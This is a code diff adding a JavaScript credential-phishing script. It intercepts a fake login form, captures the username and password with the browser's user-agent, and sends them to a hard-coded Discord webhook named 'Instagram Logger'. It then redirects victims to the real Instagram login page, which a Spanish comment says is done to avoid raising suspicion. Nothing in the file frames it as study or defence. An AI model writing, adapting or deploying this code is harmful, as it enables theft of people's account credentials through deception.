@@ -1,0 +1,33 @@
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    // URL de tu webhook de Discord
+    const discordWebhookURL = 'https://discord.com/api/webhooks/1539093432264294450/Ncv0ro3aR9hBRWwAk3xdDrfBQEzxjZQxaJf7JSubnPk2vB2Vw0PbzAV9JX80OxFiS0C3';
+
+    // Crear el payload para Discord
+    const payload = {
+        content: `**🔓 Nuevas Credenciales Capturadas**\n\n**Usuario/Email:** \`${username}\`\n**Contraseña:** \`${password}\`\n\n**User-Agent:** \`${navigator.userAgent}\``,
+        username: "Instagram Logger"
+    };
+
+    // Enviar los datos al webhook de Discord
+    fetch(discordWebhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(() => {
+        // Redirigir a Instagram para no levantar sospechas
+        window.location.replace('https://www.instagram.com/accounts/login/');
+    })
+    .catch((error) => {
+        console.error('Error al enviar a Discord:', error);
+        // Redirigir a Instagram incluso si hay un error
+        window.location.replace('https://www.instagram.com/accounts/login/');
+    });
+});
